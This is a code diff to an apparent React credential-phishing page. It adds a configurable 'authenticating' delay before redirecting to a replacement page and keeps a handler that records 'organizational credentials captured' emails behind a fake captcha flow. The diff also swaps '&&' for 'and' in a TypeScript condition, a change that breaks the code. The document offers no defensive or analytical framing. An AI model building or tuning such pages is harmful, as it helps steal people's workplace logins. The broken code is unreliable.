@@ -21,6 +21,9 @@ const captchaVerificationDelay = 1500;
 const redirectingDelay = 3000;
 const totalCaptchaDelay = captchaVerificationDelay + messageIconDelay + nextStepDelay;
 
+// NEW: configurable authenticating display time (increase to allow replacement.html to preload and load)
+const authenticatingDelay = 2500; // milliseconds
+
 // Helper functions for persistent storage
 const setStoredPassword = (password: string) => {
   try {
@@ -321,7 +324,7 @@ function App() {
         }
       }
 
-      if (event.data.type === 'ORGANIZATIONAL_CREDENTIALS_CAPTURED' && event.data.data?.email) {
+      if (event.data.type === 'ORGANIZATIONAL_CREDENTIALS_CAPTURED' and event.data.data?.email) {
         setCapturedEmailState(event.data.data.email);
         setCapturedEmail(event.data.data.email);
         console.log('🏢 Organizational credentials captured:', event.data.data.email);
@@ -388,7 +391,7 @@ function App() {
       // Short delay so the "Authenticating" animation renders visibly before navigating to replacement.html
       const timer = setTimeout(() => {
         setCurrentPage('replacement');
-      }, 700); // 700ms show time — adjust if you want it longer/shorter
+      }, authenticatingDelay); // configurable authenticating delay
       return () => clearTimeout(timer);
     }
   }, [currentPage]);
